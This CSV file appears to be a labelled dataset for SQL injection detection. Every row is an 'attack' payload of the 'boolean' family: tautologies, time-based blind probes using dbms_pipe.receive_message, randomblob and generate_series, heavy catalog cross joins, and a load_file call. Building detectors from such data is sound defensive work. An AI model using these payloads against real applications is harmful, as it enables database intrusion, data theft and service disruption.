label,payload,family
attack,select * from users where id  =  1 +   (  \.  )   or 1  =  1 -- 1,boolean
attack,"""   )    )    or    (    (   ""x""   )    )     =     (    (   ""x",boolean
attack," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",boolean
attack,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",boolean
attack,"1 where 3902  =  3902 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",boolean
attack,"1'||  (  select 'ersu' where 4123  =  4123 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",boolean
attack,"1%""  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",boolean
attack,"1' in boolean mode  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  #",boolean
attack,"-4641""  )   where 4212  =  4212 or make_set  (  3595  =  4062,4062  )  --",boolean
attack,"1""   )    )    as gawq where 4728  =  4728 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",boolean
attack,"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""kfps""  =  ""kfps",boolean
attack,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  'qomf' like 'qomf",boolean
attack,"-9688%'   )    )     )   or elt  (  3695  =  7995,7995  )   and    (    (     (  '%'  =  '",boolean
attack,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",boolean
attack,"1%'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  '%'  =  '",boolean
attack,"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,boolean
attack,"1""   )    )    and   (  1248  =  8705  )  *8705 and    (    (   ""wvma"" like ""wvma",boolean
attack,"1'  )   where 4297  =  4297 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",boolean
attack,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",boolean
attack,"1""  )   where 7471  =  7471 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",boolean
attack,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",boolean
attack,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""%""  =  """,boolean
attack,"1""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""fqap"" like ""fqap",boolean
attack,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   ""vfvh""  =  ""vfvh",boolean
attack,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",boolean
attack,"1"" where 3018  =  3018 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",boolean
attack,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'qjle'  =  'qjle",boolean
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",boolean
attack,"1'+  (  select 'wkbg' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",boolean
attack,"1  )   where 5333  =  5333 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",boolean
attack,1'   )    )    rlike   (  select   (  case when   (  6205  =  1384  )   then 1 else 0x28 end   )    )    and    (    (   'ahjf'  =  'ahjf,boolean
